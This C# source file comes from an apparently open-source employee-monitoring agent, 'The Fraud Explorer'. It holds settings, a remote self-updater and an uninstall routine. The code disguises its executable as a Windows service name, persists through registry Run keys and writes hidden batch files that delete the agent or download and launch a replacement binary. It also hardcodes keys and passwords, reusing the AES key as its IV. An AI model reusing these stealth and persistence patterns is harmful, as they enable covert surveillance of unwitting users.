/*
 * The Fraud Explorer
 * http://www.thefraudexplorer.com/
 *
 * Copyright (c) 2016 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * http://www.thefraudexplorer.com/License
 *
 * Date: 2016-06-30 15:12:41 -0500 (Wed, 30 Jun 2016)
 * Revision: v0.9.6-beta
 *
 * Description: Internal configuration
 */

using System;
using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;
using TFE_core.Database;
using TFE_core.Networking;
using TFE_core.Crypto;

namespace TFE_core.Config
{
    class Settings
    {
        /// <summary>
        /// Filesystem variables
        /// </summary>

        #region Filesystem variables

        public static string SoftwareBaseDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Software";
        public static string SoftwareUpdater = SoftwareBaseDir + "\\Updater";
        public static string AppPath = Common.SetAndCheckDir("InstallationPath") + "\\" + Settings.thefraudexplorer_executableName();

        #endregion

        /// <summary>
        /// Operating system variables
        /// </summary>

        #region Operating system variables

        public static string MainDrive = "C:\\";

        #endregion

        /// <summary>
        /// Analytics variables
        /// </summary>

        #region Analytics variables

        public const string GoogleChrome_Browser = "chrome";
        public const string MozillaFirefox_Browser = "firefox";

        #endregion

        /// <summary>
        /// Configuration variables
        /// </summary>

        #region Configuration variables

        // SQLite filepath

        public static string sqlFile()
        {
            return Common.SetAndCheckDir("InstallationPath") + "\\tfe.db3";
        }

        public const string HEARTBEAT = "heartbeat";
        public const string AAFLAG = "applicationAnalytics";
        public const string BAFLAG = "browsingAnalytics";
        public const string NAFLAG = "networkAnalytics";
        public const string DAFLAG = "deviceAnalytics";
        public const string PAFLAG = "printerAnalytics";
        public const string TAFLAG = "textAnalytics";
        public const string FAFLAG = "filesystemAnalytics";
        public const string EAFLAG = "emailAnalytics";
        public const string SRFLAG = "mainServer";
        public const string ANFLAG = "analyticsServer";
        public const string AESKEYFLAG = "aesKey";
        public const string AESIVFLAG = "aesIV";
        public const string EXEFLAG = "exeName";
        public const string REGFLAG = "registryKey";
        public const string SRPWDFLAG = "serverPassword";
        public const string HVERFLAG = "harvesterVersion";
        public const string APOSTFIXFLAG = "agentPostfix";
        public const string FPORTFLAG = "filesystemPort";
        public const string APORTFLAG = "applicationPort";
        public const string BPORTFLAG = "browsingPort";
        public const string NPORTFLAG = "networkPort";
        public const string TPORTFLAG = "textPort";
        public const string PPORTFLAG = "printersPort";
        public const string DPORTFLAG = "devicesPort";
        public const string EPORTFLAG = "emailsPort";

        // Get machine unique identification

        public static string UNIQUEGUID_VALUE()
        {
            return "_" + GetMachineGUID() + Initialization.parametersFromBinary(APOSTFIXFLAG);
        }

        public const string UNIQUEGUID = "uniqueguid";

        // Encrypt server password

        public static string AppSERVERRegisterKeyPass()
        {
            return Cryptography.EncRijndael(SQLStorage.retrievePar(Settings.SRPWDFLAG));
        }

        #endregion

        /// <summary>
        /// Cryptography variables
        /// </summary>

        #region Cryptography variables

        public static byte[] AppAESkey = Encoding.ASCII.GetBytes(SQLStorage.retrievePar(Settings.AESKEYFLAG));
        public static byte[] AppAESiv = Encoding.ASCII.GetBytes(SQLStorage.retrievePar(Settings.AESIVFLAG));

        #endregion

        /// <summary>
        /// Uninstall and update variables
        /// </summary>

        #region Uninstall and update variables

        public static string Updaterfilename = "\\updater.bat";
        public static string SelfDltFileName = "\\selfdlt.bat";

        #endregion

        /// <summary>
        /// Network variables and methods
        /// </summary>

        #region Network variables and methods

        public static string Domain = "http://" + Network.ExtractDomainFromURL(SQLStorage.retrievePar(Settings.SRFLAG));
        public static string OnlineCheck = Domain + "/online.html";
        public static string XML = SQLStorage.retrievePar(Settings.SRFLAG);
        public static string AnalyticsServerIP = SQLStorage.retrievePar(Settings.ANFLAG);
        public static string usrSession = Environment.UserName.ToLower().Replace(" ", string.Empty);
        public static string AgentID = usrSession + SQLStorage.retrievePar(UNIQUEGUID);
        public static bool use_proxy = false;
        public static string proxy_url_with_port = "http://localhost:8080";
        public static string proxy_usr = "test";
        public static string proxy_pwd = "test";
        public static string systemVersion = Cryptography.EncRijndael(Common.OSVersion());
        public static string AgentIDEncoded = Cryptography.EncRijndael(Settings.AgentID);
        public static string AppURL = Domain + "/update.php?token=" + System.Net.WebUtility.HtmlEncode(AgentIDEncoded) +
        "&s=" + System.Net.WebUtility.HtmlEncode(systemVersion) + "&v=" + Cryptography.EncRijndael(Settings.thefraudexplorer_version()) + "&k=" + AppSERVERRegisterKeyPass();

        public static string AppDataURL(String info, string command, string uniqueID, int lastPacket)
        {
            return Domain + "/getMachineDataIn.php?c=" + command +
            "&response=" + System.Net.WebUtility.HtmlEncode(Cryptography.EncRijndael(info)) +
            "&m=" + System.Net.WebUtility.HtmlEncode(Cryptography.EncRijndael(Settings.AgentID)) +
            "&id=" + System.Net.WebUtility.HtmlEncode(Cryptography.EncRijndael(uniqueID)) +
            "&end=" + System.Net.WebUtility.HtmlEncode(lastPacket.ToString());
        }

        #endregion

        /// <summary>
        /// Windows registry variables and methods
        /// </summary>

        #region Windows registry variables and methods

        public static string RegistryKeyValue = SQLStorage.retrievePar(Settings.REGFLAG);
        public static string[] registry_AppPath = new string[4];
        public const int RUNKEY = 3;
        public static string HKEYCurrentUser = "HKEY_CURRENT_USER";
        public static string HKCUFilename = "\\registryArtifacts_" + HKEYCurrentUser;
        public static string HCKURunAlternative = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

        public static string registry_vars(int keyNumber)
        {
            // Registry entry point for installation & boot

            registry_AppPath[0] = "Software\\Microsoft\\Windows\\CurrentVersion\\";
            registry_AppPath[1] = registry_AppPath[0] + "Policies\\";
            registry_AppPath[2] = registry_AppPath[1] + "Explorer\\";
            registry_AppPath[3] = registry_AppPath[2] + "Run";
            return registry_AppPath[keyNumber];
        }

        #endregion

        /// <summary>
        /// Uninstall procedure
        /// </summary>

        #region Uninstall procedure

        public static void autodestroy(string command, string uniqueID)
        {
            try 
            {              
                // Registry key deletion

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registry_vars(Settings.RUNKEY), true))
                {
                    if (key == null) { }
                    else { key.DeleteValue(Settings.RegistryKeyValue); }
                }

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(HCKURunAlternative, true))
                {
                    if (key == null) { }
                    else { key.DeleteValue(Settings.RegistryKeyValue); }
                }

                // Self delete the excutable and database

                string App = Common.SetAndCheckDir("InstallationPath") + "\\" + Settings.thefraudexplorer_executableName();
                string Database = sqlFile();

                string batchFile = "@echo off" + Environment.NewLine +
                    ":deleApp" + Environment.NewLine +
                    "attrib -h -r -s " + App + Environment.NewLine +
                    "powershell -command \"& { clc '" + App + "';}\"" + Environment.NewLine +
                    "del \"" + App + "\"" + Environment.NewLine + 
                    "if Exist \"" + App + "\" GOTO dele" + Environment.NewLine +
                    ":deleDB" + Environment.NewLine +
                    "powershell -command \"& { clc '" + Database + "';}\"" + Environment.NewLine +
                    "del \"" + Database + "\"" + Environment.NewLine +
                    "if Exist \"" + Database + "\" GOTO deleDB" + Environment.NewLine +
                    "del %0";
                  
                StreamWriter SelfDltFile = new StreamWriter(Common.SetAndCheckDir("InstallationPath") + SelfDltFileName);
                SelfDltFile.Write(batchFile);
                SelfDltFile.Close();

                Process proc = new Process();
                proc.StartInfo.FileName = Common.SetAndCheckDir("InstallationPath") + SelfDltFileName;
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo.UseShellExecute = true;
                proc.Start();
                proc.PriorityClass = ProcessPriorityClass.Normal;

                // Inform that the command was received and executed

                Network.SendData("uninstalled!", command, uniqueID, 1);

                Environment.Exit(0);
            }
            catch { };
        }

        #endregion

        /// <summary>
        /// Updater procedure
        /// </summary>

        #region Updater procedure

        public static void Updater(string url, string command, string uniqueID)
        {
            try
            {
                // Download new binary

                string url_for_download = url;

                WebClient client = new WebClient();
                if (use_proxy == true) client.Proxy = Network.SettingProxyWeb();
                client.DownloadFile(url_for_download, Common.SetAndCheckDir("UpdaterFolder") + "\\" + Settings.thefraudexplorer_executableName());

                // Self delete the excutable and copy the new one

                string OldApp = Common.SetAndCheckDir("InstallationPath") + "\\" + Settings.thefraudexplorer_executableName();
                string NewApp = Common.SetAndCheckDir("UpdaterFolder") + "\\" + Settings.thefraudexplorer_executableName();
                string batchFile = "@echo off" + Environment.NewLine +
                    ":deleupdate" + Environment.NewLine +
                    "attrib -h -r -s " + OldApp + Environment.NewLine +
                    "powershell -command \"& { clc '" + OldApp + "';}\"" + Environment.NewLine +
                    "del \"" + OldApp + "\"" + Environment.NewLine +
                    "if %ERRORLEVEL% EQU 0 GOTO cpy" + Environment.NewLine +
                    "if Exist \"" + OldApp + "\" GOTO deleupdate" + Environment.NewLine +
                    ":cpy" + Environment.NewLine +
                    "copy " + NewApp + " " + Common.SetAndCheckDir("InstallationPath") + "\\" + Environment.NewLine +
                    "attrib +h +r +s " + NewApp + Environment.NewLine +
                    "start /d \"" + Common.SetAndCheckDir("InstallationPath") + "\" " + Settings.thefraudexplorer_executableName() + Environment.NewLine +
                    "attrib -h -r -s " + NewApp + Environment.NewLine +
                    "del \"" + NewApp + "\"" + Environment.NewLine +
                    "del %0";

                StreamWriter file = new StreamWriter(Common.SetAndCheckDir("InstallationPath") + Updaterfilename);
                file.Write(batchFile);
                file.Close();

                Process proc = new Process();
                proc.StartInfo.FileName = Common.SetAndCheckDir("InstallationPath") + Updaterfilename;
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo.UseShellExecute = true;
                proc.Start();
                proc.PriorityClass = ProcessPriorityClass.Normal;

                // Inform that the command was received

                Network.SendData("upgraded to " + thefraudexplorer_version() + "!", command, uniqueID, 1);

                Environment.Exit(0);
            }
            catch { };
        }

        #endregion

        /// <summary>
        /// Application versioning and references
        /// </summary>

        #region Application versioning and references

        public static string thefraudexplorer_version()
        {
            return Initialization.parametersFromBinary(HVERFLAG);
        }

        // The Fraud Explorer Executable name reference

        public static string thefraudexplorer_executableName()
        {
            return SQLStorage.retrievePar(Settings.EXEFLAG) + ".exe";
        }

        // Get Machine ID for unique identification helper

        public static string GetMachineGUID()
        {
            Guid MachineGuid;
            MachineGuid = Guid.NewGuid();
            return MachineGuid.ToString().ToLower().Substring(0,7);
        }

        #endregion

        /// <summary>
        /// Debug options
        /// </summary>

        #region Debug options

        public static void showMessage(string e)
        {
            MessageBox.Show(e);
        }

        #endregion
    }

    class Initialization
    {
        /// <summary>
        /// Load external variables from the same exe file
        /// </summary>

        #region Load external variables from Binary

        public static string parametersFromBinary(string type)
        {
            /*
            StreamReader sreader = new StreamReader(System.Windows.Forms.Application.ExecutablePath);
            BinaryReader breader = new BinaryReader(sreader.BaseStream);

            byte[] fileData = breader.ReadBytes(Convert.ToInt32(sreader.BaseStream.Length));
            breader.Close(); sreader.Close();

            int init = Encoding.ASCII.GetString(fileData).IndexOf("-||-");
            string stringData = Encoding.ASCII.GetString(fileData, init, fileData.Length - init);
            stringData = stringData.Replace("-||-", "");
            string[] DataSplited = stringData.Split('|');

            Settings.showMessage("Hex SQLPWD: " + Cryptography.DecryptAddress(DataSplited[11]));

            if (type == "mainServer") return Cryptography.DecryptAddress(DataSplited[0]);
            if (type == "analyticsServer") return Cryptography.DecryptAddress(DataSplited[1]);
            if (type == "filesystemAnalytics") return Cryptography.DecryptAddress(DataSplited[2]);
            if (type == "applicationAnalytics") return Cryptography.DecryptAddress(DataSplited[3]);
            if (type == "browsingAnalytics") return Cryptography.DecryptAddress(DataSplited[4]);
            if (type == "networkAnalytics") return Cryptography.DecryptAddress(DataSplited[5]);
            if (type == "textAnalytics") return Cryptography.DecryptAddress(DataSplited[6]);
            if (type == "printerAnalytics") return Cryptography.DecryptAddress(DataSplited[7]);
            if (type == "deviceAnalytics") return Cryptography.DecryptAddress(DataSplited[8]);
            if (type == "emailAnalytics") return Cryptography.DecryptAddress(DataSplited[9]);      
            if (type == "heartbeat") return Cryptography.DecryptAddress(DataSplited[10]);
            if (type == "sqlitePassword") return Cryptography.DecryptAddress(DataSplited[11]);
            if (type == "exeName") return Cryptography.DecryptAddress(DataSplited[12]);
            if (type == "aesKey") return Cryptography.DecryptAddress(DataSplited[13]);
            if (type == "aesIV") return Cryptography.DecryptAddress(DataSplited[14]);
            if (type == "serverPassword") return Cryptography.DecryptAddress(DataSplited[15]);
            if (type == "registryKey") return Cryptography.DecryptAddress(DataSplited[16]);
            if (type == "harvesterVersion") return Cryptography.DecryptAddress(DataSplited[17]);
            if (type == "agentPostfix") return Cryptography.DecryptAddress(DataSplited[18]);
            if (type == "filesystemPort") return Cryptography.DecryptAddress(DataSplited[19]);
            if (type == "applicationPort") return Cryptography.DecryptAddress(DataSplited[20]);
            if (type == "browsingPort") return Cryptography.DecryptAddress(DataSplited[21]);
            if (type == "networkPort") return Cryptography.DecryptAddress(DataSplited[22]);
            if (type == "textPort") return Cryptography.DecryptAddress(DataSplited[23]);
            if (type == "printersPort") return Cryptography.DecryptAddress(DataSplited[24]);
            if (type == "devicesPort") return Cryptography.DecryptAddress(DataSplited[25]);
            if (type == "emailsPort") return Cryptography.DecryptAddress(DataSplited[26]);
            else return "";
            */

            // Debugging and MSI option
            
            if (type == "mainServer") return "http://tfe-input.mydomain.com/update.xml";
            if (type == "analyticsServer") return "192.168.1.55";
            if (type == "filesystemAnalytics") return "0";
            if (type == "applicationAnalytics") return "0";
            if (type == "browsingAnalytics") return "0";
            if (type == "networkAnalytics") return "0";
            if (type == "textAnalytics") return "1";
            if (type == "printerAnalytics") return "0";
            if (type == "deviceAnalytics") return "0";
            if (type == "emailAnalytics") return "0";
            if (type == "heartbeat") return "20000";
            if (type == "sqlitePassword") return "0x4d4b683373487635584a425546776857";
            if (type == "exeName") return "mswow64svc";
            if (type == "aesKey") return "0uBu8ycVugDIJz60";
            if (type == "aesIV") return "0uBu8ycVugDIJz60";
            if (type == "serverPassword") return "KGBz77";
            if (type == "registryKey") return "TFE_64bit";
            if (type == "harvesterVersion") return "0.9.6";
            if (type == "agentPostfix") return "_agt";
            if (type == "filesystemPort") return "5960";
            if (type == "applicationPort") return "5961";
            if (type == "browsingPort") return "5962";
            if (type == "networkPort") return "5963";
            if (type == "textPort") return "5965";
            if (type == "printersPort") return "5966";
            if (type == "devicesPort") return "5964";
            if (type == "emailsPort") return "5967";
            else return "";
        }

        #endregion
    }

    class DLLEmbed
    {
        /// <summary>
        /// Embed DLL
        /// </summary>

        #region Embed DLL

        static Dictionary<string, Assembly> dic = null;

        public static void Load(string embeddedResource, string fileName)
        {
            if (dic == null) dic = new Dictionary<string, Assembly>();

            byte[] ba = null;
            Assembly asm = null;
            Assembly curAsm = Assembly.GetExecutingAssembly();

            using (Stream stm = curAsm.GetManifestResourceStream(embeddedResource))
            {
                if (stm == null) throw new Exception(embeddedResource + " is not found in Embedded Resources.");
                ba = new byte[(int)stm.Length];
                stm.Read(ba, 0, (int)stm.Length);
                try
                {
                    asm = Assembly.Load(ba);
                    dic.Add(asm.FullName, asm);
                    return;
                }
                catch { }
            }

            bool fileOk = false;
            string tempFile = "";

            using (SHA1CryptoServiceProvider sha1 = new SHA1CryptoServiceProvider())
            {
                string fileHash = BitConverter.ToString(sha1.ComputeHash(ba)).Replace("-", string.Empty);
                tempFile = Path.GetTempPath() + fileName;

                if (File.Exists(tempFile))
                {
                    byte[] bb = File.ReadAllBytes(tempFile);
                    string fileHash2 = BitConverter.ToString(sha1.ComputeHash(bb)).Replace("-", string.Empty);

                    if (fileHash == fileHash2) fileOk = true;
                    else fileOk = false;
                }
                else fileOk = false;
            }
            if (!fileOk) System.IO.File.WriteAllBytes(tempFile, ba);
            asm = Assembly.LoadFile(tempFile);
            dic.Add(asm.FullName, asm);
        }

        public static Assembly Get(string assemblyFullName)
        {
            if (dic == null || dic.Count == 0) return null;
            if (dic.ContainsKey(assemblyFullName)) return dic[assemblyFullName];
            return null;
        }

        #endregion
    }
}
